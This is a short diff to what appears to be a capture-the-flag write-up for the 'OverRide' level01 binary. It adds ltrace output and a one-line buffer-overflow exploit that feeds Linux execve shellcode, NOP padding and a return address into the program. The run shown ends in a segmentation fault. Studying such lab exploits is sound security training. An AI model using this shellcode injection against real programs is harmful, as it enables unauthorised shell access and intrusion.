@@ -76,6 +76,23 @@ x *0xffffd6ec
 ```
 
 
+nothing
+
+```
+ltrace ./level01
+
+puts("Enter Password: "Enter Password:
+)                                         = 17
+fgets(AAAA
+"AAAA\n", 100, 0xf7fcfac0)                                 = 0xffffd6ac
+
+
+level01@OverRide:~$ (python -c 'print "dat_will"'; python -c 'print  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"  + "\x90" * 59 + "\xff\xff\xd6\xac"[::-1]'; cat -)  | ./level01
+
+pwd
+Segmentation fault (core dumped)
+```
+
 
 
 
